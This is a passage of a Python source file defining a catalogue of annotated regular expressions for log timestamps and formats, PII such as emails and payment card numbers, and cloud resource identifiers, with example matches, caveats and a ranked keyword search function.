        summary="The S-1-5-21-… form, including well-known short SIDs.",
        caveat="A SID identifies a principal in one domain. The RID tail is "
               "what tells you it is the built-in Administrator (-500).",
        matches=("S-1-5-21-3623811015-3361044348-30300820-1013", "S-1-5-18"),
        avoids=("S-1", "1-5-21-1"),
        tags=("sid", "identity", "domain"),
    ),

    # ------------------------------------------------------------------- logs
    Entry(
        id="iso8601",
        title="ISO 8601 timestamp",
        family=LOGS,
        pattern=r"\b\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}"
                r"(?:\.\d{1,9})?(?:Z|[+-]\d{2}:?\d{2})?\b",
        summary="Date and time with optional fractional seconds and offset.",
        caveat="Does not validate the date — 2024-13-45 matches. If the offset "
               "is missing you do not know the timezone, and neither does the log.",
        matches=("2024-03-11T09:15:02.331Z", "2024-03-11 09:15:02+01:00"),
        avoids=("11/03/2024 09:15",),
        tags=("time", "timestamp", "iso"),
    ),
    Entry(
        id="syslog_time",
        title="Syslog timestamp",
        family=LOGS,
        pattern=r"\b(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)"
                r"\s{1,2}\d{1,2}\s\d{2}:\d{2}:\d{2}\b",
        summary="The RFC 3164 'Mar 11 09:15:02' form, with its padded day.",
        caveat="Carries no year and no timezone. Correlating across a new year "
               "boundary with this alone is guesswork.",
        matches=("Mar 11 09:15:02", "Mar  1 09:15:02"),
        avoids=("2024-03-11 09:15:02",),
        tags=("syslog", "rfc3164", "time"),
    ),
    Entry(
        id="epoch",
        title="Unix epoch seconds",
        family=LOGS,
        pattern=r"\b1[0-9]{9}(?:\.\d{1,6})?\b",
        summary="A ten-digit epoch in the 2001–2033 range, optionally fractional.",
        caveat="Any ten-digit number starting with 1 matches — including phone "
               "numbers and IDs. Anchor it to its field.",
        matches=("1710148502", "1710148502.884"),
        avoids=("171014850", "9876543210"),
        tags=("time", "epoch", "unix"),
    ),
    Entry(
        id="apache_clf",
        title="Apache combined log line",
        family=LOGS,
        pattern=r"^(\S+) (\S+) (\S+) \[([^\]]+)\] \"([^\"]*)\" (\d{3}) (\d+|-)",
        summary="Host, identity, user, time, request, status and size.",
        caveat="Breaks on any field containing an unescaped quote. Nginx's "
               "default differs slightly — check before reusing.",
        matches=('10.0.0.1 - alice [11/Mar/2024:09:15:02 +0000] "GET / HTTP/1.1" 200 1234',),
        avoids=("not a log line",),
        tags=("apache", "clf", "access-log"),
    ),
    Entry(
        id="cef",
        title="CEF header",
        family=LOGS,
        pattern=r"CEF:\d+\|([^|]*)\|([^|]*)\|([^|]*)\|([^|]*)\|([^|]*)\|([^|]*)\|",
        summary="The seven pipe-delimited fields of an ArcSight CEF header.",
        caveat="Pipes inside a field must be escaped as \\| — unescaped ones "
               "will shift every capture group along by one.",
        matches=("CEF:0|Vendor|Product|1.0|100|Login failure|5|src=10.0.0.1",),
        avoids=("LEEF:1.0|Vendor",),
        tags=("cef", "siem", "arcsight"),
    ),
    Entry(
        id="log_level",
        title="Severity keyword",
        family=LOGS,
        pattern=r"\b(?:EMERG|ALERT|CRIT(?:ICAL)?|ERR(?:OR)?|WARN(?:ING)?|"
                r"NOTICE|INFO|DEBUG|TRACE|FATAL)\b",
        summary="The usual severity words, upper case to avoid prose hits.",
        caveat="Case-sensitive on purpose. Lower-case 'info' appears in "
               "ordinary English constantly.",
        matches=("[ERROR] failed to bind", "level=WARN"),
        avoids=("information about the error",),
        tags=("severity", "level", "triage"),
    ),

    # -------------------------------------------------------------------- PII
    Entry(
        id="email",
        title="Email address",
        family=PII,
        pattern=r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,24}\b",
        summary="The pragmatic form: everything ordinary addresses use.",
        caveat="Deliberately not RFC 5322 — that grammar allows quoted local "
               "parts and comments, and matching it fully is a ReDoS classic.",
        matches=("alice.smith+tag@example.co.uk",),
        avoids=("alice@", "@example.com"),
        tags=("email", "pii", "redact"),
    ),
    Entry(
        id="credit_card",
        title="Payment card number",
        family=PII,
        pattern=rf"(?<![\d-])(?:"
                rf"4\d{{3}}{_CS}\d{{4}}{_CS}\d{{4}}{_CS}\d{{4}}"
                rf"|4\d{{12}}"
                rf"|(?:5[1-5]\d{{2}}|222[1-9]|22[3-9]\d|2[3-6]\d\d|27[01]\d|2720)"
                rf"{_CS}\d{{4}}{_CS}\d{{4}}{_CS}\d{{4}}"
                rf"|3[47]\d{{2}}{_CS}\d{{6}}{_CS}\d{{5}}"
                rf"|6(?:011|5\d{{2}}){_CS}\d{{4}}{_CS}\d{{4}}{_CS}\d{{4}}"
                rf"|3(?:0[0-5]|[68]\d)\d{{11}}"
                rf")(?![\d-])",
        summary="Visa, Mastercard (both BIN ranges), Amex, Discover and Diners, "
                "written bare or in groups of four.",
        caveat="Does not run the Luhn check, so a fraction of hits are not "
               "valid card numbers. Uses lookaround, so RE2 and POSIX grep "
               "cannot run it. Sieve's scanner can redact these for you.",
        matches=("4111111111111111", "5500005555555559", "378282246310005",
                 "2223003122003222", "2720990000000000",
                 "4111 1111 1111 1111", "5500-0055-5555-5559"),
        avoids=("1234567812345678", "411111111111111", "1234 5678 1234 5678"),
        tags=("pci", "pan", "redact"),
    ),
    Entry(
        id="uuid",
        title="UUID",
        family=PII,
        pattern=r"\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-8][0-9a-fA-F]{3}-"
                r"[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}\b",
        summary="A version-and-variant-correct UUID, versions 1 through 8.",
        caveat="A v1 UUID encodes a MAC address and a timestamp. That is "
               "sometimes the finding.",
        matches=("550e8400-e29b-41d4-a716-446655440000",),
        avoids=("550e8400-e29b-01d4-a716-446655440000",),
        tags=("guid", "identifier"),
    ),
    Entry(
        id="phone_e164",
        title="Phone number, E.164",
        family=PII,
        pattern=r"(?<![\d.])\+[1-9]\d{7,14}(?![\d.])",
        summary="The international form: plus, country code, up to fifteen digits.",
        caveat="Only the normalised form. Nationally formatted numbers vary "
               "too much between countries for one honest pattern.",
        matches=("+441632960961", "+12025550143"),
        avoids=("+0123456", "441632960961"),
        tags=("phone", "pii", "e164"),
    ),

    # ------------------------------------------------------------------ cloud
    Entry(
        id="aws_arn",
        title="AWS ARN",
        family=CLOUD,
        pattern=r"\barn:aws[a-z-]*:[a-z0-9-]+:[a-z0-9-]*:\d{0,12}:[^\s\"']+",
        summary="Any Amazon Resource Name, including gov and China partitions.",
        caveat="The resource part varies wildly by service, so the tail is "
               "loose. Capture it and parse per service if you need detail.",
        matches=("arn:aws:iam::123456789012:role/Admin",
                 "arn:aws-us-gov:s3:::my-bucket/key"),
        avoids=("arn:aws",),
        tags=("aws", "arn", "resource"),
    ),
    Entry(
        id="s3_bucket_url",
        title="S3 bucket URL",
        family=CLOUD,
        pattern=r"\b(?:https?://)?(?:[a-z0-9.-]{3,63}\.s3(?:[.-][a-z0-9-]+)?"
                r"\.amazonaws\.com|s3(?:[.-][a-z0-9-]+)?\.amazonaws\.com/"
                r"[a-z0-9.-]{3,63})\b",
        summary="Virtual-hosted and path-style bucket addresses.",
        caveat="Finding the URL says nothing about whether the bucket is "
               "public. That takes a request you should be authorised to make.",
        matches=("https://my-bucket.s3.eu-west-1.amazonaws.com",
                 "s3.amazonaws.com/other-bucket"),
        avoids=("https://example.com/s3",),
        tags=("aws", "s3", "storage"),
    ),
    Entry(
        id="azure_storage",
        title="Azure storage endpoint",
        family=CLOUD,
        pattern=r"\b[a-z0-9]{3,24}\.(?:blob|file|queue|table|dfs)\.core\.windows\.net\b",
        summary="The storage-account hostname for each Azure storage service.",
        caveat="A SAS token in the query string is the secret, not the "
               "hostname. Search for 'sig=' alongside this.",
        matches=("mystorageacct.blob.core.windows.net",),
        avoids=("example.blob.core.example.net",),
        tags=("azure", "storage", "blob"),
    ),
    Entry(
        id="gcp_service_account",
        title="GCP service account address",
        family=CLOUD,
        pattern=r"\b[a-z][a-z0-9-]{4,28}[a-z0-9]@[a-z][a-z0-9-]{4,28}"
                r"\.iam\.gserviceaccount\.com\b",
        summary="The name@project.iam.gserviceaccount.com identity form.",
        caveat="Identifies the principal; the key file that authenticates as "
               "it is the thing worth protecting.",
        matches=("deployer@my-project-123.iam.gserviceaccount.com",),
        avoids=("me@example.com",),
        tags=("gcp", "iam", "identity"),
    ),
]

BY_ID = {e.id: e for e in ENTRIES}


def search(query: str) -> list[Entry]:
    """Match against title, summary, tags and family — in that priority."""
    q = query.strip().lower()
    if not q:
        return list(ENTRIES)
    scored: list[tuple[int, Entry]] = []
    for e in ENTRIES:
        score = 0
        if q in e.title.lower():
            score += 10
        if q == e.id or q in e.id:
            score += 8
        if any(q in t for t in e.tags):
            score += 6
        if q in e.summary.lower():
            score += 3
        if q in e.family.lower():
            score += 2
        if score:
            scored.append((score, e))
    scored.sort(key=lambda p: (-p[0], p[1].title))
    return [e for _, e in scored]
